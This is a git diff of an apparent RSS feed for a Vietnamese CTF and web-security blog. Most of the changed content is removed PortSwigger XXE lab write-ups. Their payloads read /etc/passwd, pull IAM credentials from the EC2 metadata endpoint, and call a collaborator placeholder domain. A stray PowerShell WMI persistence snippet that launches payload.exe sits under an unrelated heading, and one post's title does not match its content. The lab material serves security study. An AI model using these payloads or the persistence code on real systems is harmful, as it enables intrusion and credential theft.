+<p><a href="https://www.ambionics.io/blog/laravel-debug-rce" target="_blank" rel="noopener noreffer">https://www.ambionics.io/blog/laravel-debug-rce</a>
+</p>
+<p><a href="https://knqyf263.hatenablog.com/entry/2021/10/09/165405" target="_blank" rel="noopener noreffer">https://knqyf263.hatenablog.com/entry/2021/10/09/165405</a>
+</p>
+]]></description>
+</item>
+<item>
     <title>CookieCTF - The Existed File</title>
     <link>https://g03m0n.github.io/posts/cookiectf-the-existed-file/cookiectf-the-existed-file/</link>
     <pubDate>Sat, 20 Jan 2024 08:29:01 &#43;0800</pubDate>
@@ -298,7 +550,7 @@ Thay vì <code>inject</code> một câu lệnh để server thực hiện sau kh
 <h3 id="description">Description</h3>
 <blockquote>
 <p>This lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result. To solve the lab, edit the serialized object in the session cookie to exploit this vulnerability and gain administrative privileges. Then, delete Carlos&rsquo;s account.
-You can log in to your own account using the following credentials: wiener:peter</p>
+You can log in to your own account using the5 following credentials: wiener:peter</p>
 </blockquote>
 <h3 id="exploitaion">Exploitaion</h3>
 <p>Challenge này yêu cầu ta thay đổi thuộc tính trên serialized objects để leo quyền lên admin.</p>
@@ -817,124 +1069,6 @@ Từ <code>web_jscalc/challenge/routes/computerHelper.js</code>, hàm <code>calc
 <pre tabindex="0"><code>require(&#39;fs&#39;).readFileSync(&#34;/flax.txt&#34;).toString()
 </code></pre><p></p>
 <p>Flag: <code>HTB{c4lcul4t3d_my_w4y_thr0ugh_rc3}</code></p>
-]]></description>
-</item>
-<item>
-    <title>Vulhub - Mr.Robot</title>
-    <link>https://g03m0n.github.io/posts/portswigger-xxe/portswigger-xxe/</link>
-    <pubDate>Mon, 21 Aug 2023 08:29:01 &#43;0800</pubDate>
-    <author>g03m0n</author>
-    <guid>https://g03m0n.github.io/posts/portswigger-xxe/portswigger-xxe/</guid>
-    <description><![CDATA[<h2 id="description">Description</h2>
-<p>Link lab tại <a href="https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files" target="_blank" rel="noopener noreffer">đây</a>
-</p>
-<blockquote>
-<p>This lab has a &ldquo;Check stock&rdquo; feature that parses XML input and returns any unexpected values in the response.
-To solve the lab, inject an XML external entity to retrieve the contents of the /etc/passwd file.</p>
-</blockquote>
-<h2 id="exploitation">Exploitation</h2>
-<p>Ứng dụng có chức năng kiểm tra hàng tồn kho tại mỗi post của sản phẩm</p>
-<p>Khi click <code>Check stock</code>, một POST request gửi đến <code>/product/stock</code> với body là một dạng XML gồm 2 trường query chính là <code>productId</code> và <code>storeId</code>. Server sẽ trả về số lượng sản phẩm còn lại trong kho.</p>
-<p></p>
-<p>Tại đây, server không có một cơ chế <code>validate</code> XML nào nên ta có thể định nghĩa một <code>external entity</code> <code>&amp;xxe;</code> mà giá trị của nó là nội dung file <code>/etc/passwd</code> và sử dụng <code>entity</code> <code>&amp;xxe;</code> tại trường <code>productId</code>.</p>
-<p>Payload:</p>
-<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
-&lt;!DOCTYPE keke [&lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34; &gt;]&gt;
-&lt;stockCheck&gt;
-  &lt;productId&gt; &amp;xxe; &lt;/productId&gt;
-  &lt;storeId&gt;1&lt;/storeId&gt;
-&lt;/stockCheck&gt;
-</code></pre><p></p>
-<p>Solved</p>
-<p></p>
-<h2 id="description-1">Description</h2>
-<p>Link lab tại <a href="https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf" target="_blank" rel="noopener noreffer">đây</a>
-</p>
-<blockquote>
-<p>This lab has a &ldquo;Check stock&rdquo; feature that parses XML input and returns any unexpected values in the response.
-The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is http://169.254.169.254/. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.
-To solve the lab, exploit the XXE vulnerability to perform an SSRF attack that obtains the server&rsquo;s IAM secret access key from the EC2 metadata endpoint.</p>
-</blockquote>
-<h2 id="exploitation-1">Exploitation</h2>
-<p>Tương tự bài trên, ta sẽ thực hiện <code>SSRF attack</code> để định nghĩa một <code>external entity</code> <code>&amp;xxe;</code> mà giá trị của nó là <code>http://169.254.169.254/</code> và sử dụng <code>entity</code> tại trường <code>productId</code>.</p>
-<p>Payload:</p>
-<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
-&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &#34;http://169.254.169.254/&#34; &gt;]&gt;
-&lt;stockCheck&gt;
-    &lt;productId&gt; &amp;xxe; &lt;/productId&gt;
-    &lt;storeId&gt; 2 &lt;/storeId&gt;
-&lt;/stockCheck&gt;
-</code></pre><p></p>
-<p>Tìm ra được folder <code>latest</code></p>
-<p></p>
-<p>Sử dụng đường dẫn trên kết hợp với folder <code>latest</code> ta được:</p>
-<p>Payload:</p>
-<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
-&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &#34;http://169.254.169.254/latest&#34; &gt;]&gt;
-&lt;stockCheck&gt;
-    &lt;productId&gt; &amp;xxe; &lt;/productId&gt;
-    &lt;storeId&gt; 2 &lt;/storeId&gt;
-&lt;/stockCheck&gt;
-</code></pre><p></p>
-<p>Lặp đi lặp lại các bước ta tìm ra được endpoint <code>admin</code>: <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/admin</code></p>
-<p>Payload:</p>
-<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
-&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &#34;http://169.254.169.254/latest/meta-data/iam/security-credentials/admin&#34; &gt;]&gt;
-&lt;stockCheck&gt;
-    &lt;productId&gt; &amp;xxe; &lt;/productId&gt;
-    &lt;storeId&gt; 2 &lt;/storeId&gt;
-&lt;/stockCheck&gt;
-</code></pre><p></p>
-<p>Solved</p>
-<p></p>
-<h2 id="3-blind-xxe-with-out-of-band-interaction">3. Blind XXE with out-of-band interaction</h2>
-<h3 id="description-2">Description</h3>
-<p>Link lab tại <a href="https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction" target="_blank" rel="noopener noreffer">đây</a>
-</p>
-<blockquote>
-<p>This lab has a &ldquo;Check stock&rdquo; feature that parses XML input but does not display the result.
-You can detect the blind XXE vulnerability by triggering out-of-band interactions with an external domain.
-To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.</p>
-</blockquote>
-<h3 id="exploitation-2">Exploitation</h3>
-<p>Đây là một bài lab <code>Blind XXE injection</code>, server không trả về kết quả attacker mong muốn. Vì vậy ta có thể sử dụng kĩ thuật <code>out-of-band</code> sau để tiến hành khai thác.
-Payload</p>
-<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
-&lt;!DOCTYPE keke [&lt;!ENTITY xxe SYSTEM &#34;http://&lt;COLABORATOR_DOMAIN&gt;&#34;&gt;]&gt;
-&lt;stockCheck&gt;
-    &lt;productId&gt; &amp;xxe; &lt;/productId&gt;
-    &lt;storeId&gt; 2 &lt;/storeId&gt;
-&lt;/stockCheck&gt;
-</code></pre><p></p>
-<p>Solved</p>
-<p></p>
-<h3 id="description-3">Description</h3>
-<p>Link lab tại <a href="https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities" target="_blank" rel="noopener noreffer">đây</a>
-</p>
-<h3 id="exploitation-3">Exploitation</h3>
-<h2 id="description-4">Description</h2>
-<p>Link lab tại <a href="https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration" target="_blank" rel="noopener noreffer">đây</a>
-</p>
-<h2 id="exploitation-4">Exploitation</h2>
-<h2 id="description-5">Description</h2>
-<p>Link lab tại <a href="https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages" target="_blank" rel="noopener noreffer">đây</a>
-</p>
-<h2 id="exploitation-5">Exploitation</h2>
-<h2 id="description-6">Description</h2>
-<p>Link lab tại <a href="https://portswigger.net/web-security/xxe/lab-xinclude-attack" target="_blank" rel="noopener noreffer">đây</a>
-</p>
-<h2 id="exploitation-6">Exploitation</h2>
-<h2 id="description-7">Description</h2>
-<p>Link lab tại <a href="https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload" target="_blank" rel="noopener noreffer">đây</a>
-</p>
-<h2 id="exploitation-7">Exploitation</h2>
-<h2 id="description-8">Description</h2>
-<p>Link lab tại <a href="https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd" target="_blank" rel="noopener noreffer">đây</a>
-</p>
-<h2 id="exploitation-8">Exploitation</h2>
-<p>$filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments @{EventNamespace = &lsquo;root/cimv2&rsquo;; Name = &ldquo;UPDATER&rdquo;; Query = &ldquo;SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA &lsquo;Win32_NTLogEvent&rsquo; AND Targetinstance.EventCode = &lsquo;4625&rsquo; And Targetinstance.Message Like &lsquo;%fakeuser%&rsquo;&rdquo;; QueryLanguage = &lsquo;WQL&rsquo;}
-$consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments @{Name = &ldquo;UPDATER&rdquo;; CommandLineTemplate = &ldquo;C:\Users\sec560\Desktop\payload.exe&rdquo;}
-$FilterToConsumerBinding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments @{Filter = $Filter; Consumer = $Consumer}</p>
 ]]></description>
 </item>
 </channel>
